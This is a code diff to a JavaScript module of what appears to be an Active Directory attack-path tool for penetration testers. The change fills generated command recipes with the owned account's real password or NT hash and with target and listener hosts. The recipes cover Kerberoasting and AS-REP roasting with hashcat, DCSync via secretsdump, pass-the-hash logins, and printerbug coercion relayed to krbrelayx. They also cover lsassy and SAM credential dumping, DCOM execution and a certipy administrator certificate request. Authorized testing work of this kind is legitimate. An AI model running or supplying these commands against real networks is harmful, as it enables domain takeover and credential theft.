@@ -491,43 +491,69 @@
   // Per-query copy-paste command recipes, token-filled from the (optional) owned principal + a
   // best-effort DC/domain. A browser tool has no credential store, so where a secret/host isn't
   // known a placeholder (USER / DC / <HOST> / '') is left for the operator to fill.
-  function domainActionCommands(summary, ownedPrincipals) {
+  function domainActionCommands(summary, ownedPrincipals, ctx) {
+    ctx = ctx || {};
     var u = (ownedPrincipals && ownedPrincipals.length) ? label(ownedPrincipals[0]) : 'USER';
-    var dc = 'DC';
+    // Fill from the engagement where we know it: the DC/target host, and the owned account's secret
+    // (an NT hash as -H, or a password as -p '…'). Unknown values keep their operator placeholders.
+    var dc = ctx.dc || 'DC';
     var domain = summary.domain || 'DOMAIN';
-    var sec = "-p ''"; // no secret held in-browser
-    var imp = "'" + domain + '/' + u + "'@" + dc;
-    return {
+    var sec = ctx.secret || "-p ''";
+    var pw = ctx.pw || '', nt = ctx.nt || '';
+    // Per-tool auth built from the RAW secret, so a hash-only identity gets pass-the-hash flags instead
+    // of a blank password: impacket -hashes, evil-winrm -H, xfreerdp /pth, certipy -hashes.
+    var imp = pw ? ("'" + domain + '/' + u + ':' + pw + "'@" + dc)
+      : nt ? ("'" + domain + '/' + u + "'@" + dc + ' -hashes :' + nt)
+      : ("'" + domain + '/' + u + "'@" + dc);
+    var winrmAuth = pw ? ("-p '" + pw + "'") : nt ? ('-H ' + nt) : "-p ''";
+    var rdpAuth = pw ? ("/p:'" + pw + "'") : nt ? ('/pth:' + nt) : "/p:''";
+    var printerAuth = pw ? (domain + '/' + u + ":'" + pw + "'@<HOST>") : nt ? ('-hashes :' + nt + ' ' + domain + '/' + u + '@<HOST>') : (domain + '/' + u + ":''@<HOST>");
+    var certAuth = pw ? ("-p '" + pw + "'") : nt ? ('-hashes :' + nt) : '';
+    var recipes = {
       asrep: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --asreproast asrep.hashes',
               'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt'],
       kerberoast: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --kerberoasting kerb.hashes',
                    'hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt'],
       dcsync: ['impacket-secretsdump ' + imp + ' -just-dc',
                'impacket-secretsdump ' + imp + ' -just-dc-user administrator'],
-      unconstrained: ['python3 printerbug.py ' + domain + '/' + u + ":''@<HOST> <YOUR_IP>",
+      unconstrained: ['python3 printerbug.py ' + printerAuth + ' <YOUR_IP>',
                       'sudo python3 krbrelayx.py --krbpass -u <HOST>\\$ # capture the coerced DC TGT'],
       adminto: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' --sam --lsa',
                 'nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy'],
       sessions: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy   # dump where the DA is logged in'],
-      rdp: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + " /p:'' /v:<HOST> /cert:ignore"],
-      winrm: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + " -p ''"],
+      rdp: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + ' ' + rdpAuth + ' /v:<HOST> /cert:ignore'],
+      winrm: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + ' ' + winrmAuth],
       passwordnotreqd: ["nxc smb " + dc + " -u <ACCOUNT> -p ''   # blank-password auth check"],
-      rdp_reach: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + " /p:'' /v:<HOST> /cert:ignore"],
-      psremote_reach: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + " -p ''"],
+      rdp_reach: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + ' ' + rdpAuth + ' /v:<HOST> /cert:ignore'],
+      psremote_reach: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + ' ' + winrmAuth],
       dcom_reach: ['impacket-dcomexec ' + imp + ' -object MMC20   # DCOM execution reach',
                    'nxc smb <HOST> -u ' + u + ' ' + sec + ' -x whoami   # confirm the reach'],
       foreign: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --query "(objectClass=foreignSecurityPrincipal)" ""'],
-      esc: ['certipy find -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -vulnerable -stdout',
-            'certipy req -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -ca <CA> -template <TEMPLATE> -upn administrator@' + domain],
+      esc: ['certipy find -u ' + u + '@' + domain + (certAuth ? (' ' + certAuth) : '') + ' -dc-ip ' + dc + ' -vulnerable -stdout',
+            'certipy req -u ' + u + '@' + domain + (certAuth ? (' ' + certAuth) : '') + ' -dc-ip ' + dc + ' -ca <CA> -template <TEMPLATE> -upn administrator@' + domain],
     };
+    // Substitute the remaining host tokens from the engagement when known: <HOST> defaults to the
+    // primary target, <YOUR_IP> to the operator's listener IP. Per-node hosts stay adjustable.
+    var host = ctx.host, yourip = ctx.lhost;
+    if (host || yourip) {
+      Object.keys(recipes).forEach(function (key) {
+        recipes[key] = recipes[key].map(function (c) {
+          var s = c;
+          if (host) s = s.split('<HOST>').join(host);
+          if (yourip) s = s.split('<YOUR_IP>').join(yourip);
+          return s;
+        });
+      });
+    }
+    return recipes;
   }
 
   // The Domain tab's model: a PlumHound-style board of canned high-value queries answered from the
   // summary, plus the derived owned→Domain-Admins path(s). Pure — no network, no writes.
-  function domainView(summary, ownedPrincipals) {
+  function domainView(summary, ownedPrincipals, ctx) {
     summary = summary || {};
     var sections = [];
-    var cmds = domainActionCommands(summary, ownedPrincipals);
+    var cmds = domainActionCommands(summary, ownedPrincipals, ctx);
     function sec(sid, title, hint, items, cash) {
       var rows = (items || []).map(label);
       sections.push({ id: sid, title: title, hint: hint, cash: cash || '',
@@ -890,6 +916,7 @@
     ownedPaths: ownedPaths,
     pathsToGraph: pathsToGraph,
     domainView: domainView,
+    domainActionCommands: domainActionCommands,
     domainReportHtml: domainReportHtml,
     toFacts: toFacts,
     // low-level helpers (exposed for tests / advanced callers)
